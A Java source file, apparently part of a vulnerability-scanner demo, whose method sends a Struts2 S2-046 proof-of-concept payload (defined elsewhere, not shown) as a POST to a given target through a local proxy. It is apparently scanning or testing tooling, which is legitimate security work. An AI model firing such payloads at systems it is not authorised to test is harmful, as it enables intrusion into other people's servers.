package com.example.javafxdemo.Check;
import com.example.javafxdemo.Check.Payload;
import cn.hutool.http.HttpRequest;
import com.example.javafxdemo.HelloController;
import java.util.HashMap;



public class checks {
    public void struts2046(String target){
        HashMap<String,String> heinfo=HelloController.helloinfo;
        Payload.PAYLOADSTR payload=new Payload.PAYLOADSTR();

        String payload_post=payload.POC046;
        String ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
        String cookie="1";
        String proxyhost="127.0.0.1";
        int port=8080;
        String methodFields=heinfo.get("methodFields");

        HttpRequest req = HttpRequest.post(target ).timeout(15000).body(payload_post).setConnectionTimeout(15000);
        String  resp = req.header("User-Agent", ua)
                .header("Connection", "close")
                .cookie(cookie)
                .setHttpProxy(proxyhost, port)
                .execute()
                .httpVersion("HTTP/1.0")
                .toString();
        System.out.println(payload_post);
    }

}
